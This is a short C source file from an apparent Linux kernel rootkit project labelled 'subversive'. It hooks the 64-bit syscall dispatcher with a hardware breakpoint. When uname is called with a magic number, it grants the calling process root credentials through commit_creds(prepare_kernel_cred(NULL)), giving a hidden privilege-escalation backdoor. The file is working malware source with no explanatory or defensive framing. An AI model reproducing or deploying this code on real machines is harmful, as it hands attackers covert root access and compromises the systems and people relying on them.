#include <asm/unistd.h>
#include <linux/kernel.h>

#include <subversive/config.h>
#include <subversive/ksyms.h>
#include <subversive/x86.h>

/*
 * rookit interface
 */

void handle_do_syscall_64_breakpoint(struct pt_regs *regs)
{
	struct pt_regs *do_sys_regs = (struct pt_regs *)regs->si;
	int nr = regs->di;
	long magic_number = do_sys_regs->di;

	if (nr == __NR_uname) {
		if (magic_number == MAGIC_NUMBER_GET_ROOT && ksyms.commit_creds && ksyms.prepare_kernel_cred) {
			pr_debug("%s: commit root creds\n", __func__);
			ksyms.commit_creds(ksyms.prepare_kernel_cred(NULL));
		} else if (magic_number == MAGIC_NUMBER_DEBUG_RK) {
			x86_hw_breakpoint_debug();
		}
	}
}

int hook_sys_call_table(void)
{
	x86_hw_breakpoint_register(0, ksyms.do_syscall_64, DR_RW_EXECUTE, 0, handle_do_syscall_64_breakpoint);

	return 0;
}
